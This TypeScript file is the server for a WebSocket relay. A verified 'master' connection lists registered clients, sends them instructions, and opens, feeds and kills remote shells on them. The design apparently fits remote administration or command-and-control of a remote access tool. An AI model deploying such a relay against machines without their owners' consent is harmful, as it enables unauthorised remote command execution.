import express from "express";
import https from "https";
import beautify from "json-beautify"
import fs from "fs"
import ws, { Server as WebSocketServer } from "ws";
import { AddClient } from './client-config';
import { ClientsInterface, WSEvent } from './interfaces/core/base';
import { KillInterface } from './interfaces/remote/killproc';
import { getClients } from './responses/clients';
import { handleInstruction } from './responses/instruction';
import { handleKillShells } from './responses/kill_shells';
import { sendPing } from './responses/ping';
import { handleShellInput } from './responses/shell_input';
import { handleShellStart } from './responses/shell_started';
import { verifyClient } from './responses/verify';
import { sendWelcomeMSG } from './responses/welcome';

const app = express();
const { PORT: port } = process.env;

const privateKey = fs.readFileSync(`./src/cert/privkey.pem`, "utf-8")
const fullchain = fs.readFileSync(`./src/cert/fullchain.pem`, "utf-8")


const httpsServer = https.createServer({
  key: privateKey,
  cert: fullchain
}, app)

const wsServer = new WebSocketServer({
  server: httpsServer
});

let onlineClients: ClientsInterface = {};
let master: ws;

wsServer.on('connection', socket => {
  let verified = false;
  let id;
  sendWelcomeMSG(socket);

  socket.on('message', async message => {

    try {
      const event: WSEvent = JSON.parse(message.toString())
      if(event?.name !== "ping") console.log(beautify(event, null, 2, 80))

      switch (event.name) {
        case "ping":
          sendPing(socket);
          break;
        case "get_clients":
          if (!verified)
            break;

          getClients(socket, onlineClients);
          break;

        case "verify":
          verified = verifyClient(socket, event.data);
          if (verified) {
            master = socket;
            console.log("Master connected.")
            master.on("close", () => {
              console.log("Master disconnected.")
              master = undefined;
            })
          }

          break;

        case "id":
          if (!id) {
            onlineClients[event.data.id] = socket;
            AddClient(event.data.id)
            id = event.data.id
          } else
            socket.close();
          break;

        case "instruction":
          handleInstruction(verified, event.data, onlineClients);
          break;

        case "terminated":
          if (verified)
            break;

          const terminatedResp: WSEvent = {
            name: "terminated",
            data: {
              client: id,
              pid: event.data.pid
            }
          }

          master.send(JSON.stringify(terminatedResp))
          break;

        case "shell":
          handleShellInput(verified, event.data, onlineClients, master, id);
          break;

        case "killshells":
          if (!verified)
            break;

          handleKillShells(event.data, onlineClients);
          break;

        case "shellstarted":
          if (!id) break;

          handleShellStart(event.data, master, id)
          break;

        default:
          break;
      }
    } catch (e) {
      console.log(e)
    }
  });

  socket.on("close", () => {
    console.log("Deleting id", id, "...")
    delete onlineClients[id]

    Object.values(onlineClients).forEach(client => {

      const kill: KillInterface = {
        name: "killshells",
        data: {}
      }
      client.send(JSON.stringify(kill))
    })
  })
});



httpsServer.listen(port, () => {
  console.log("Listening on port", port)
});
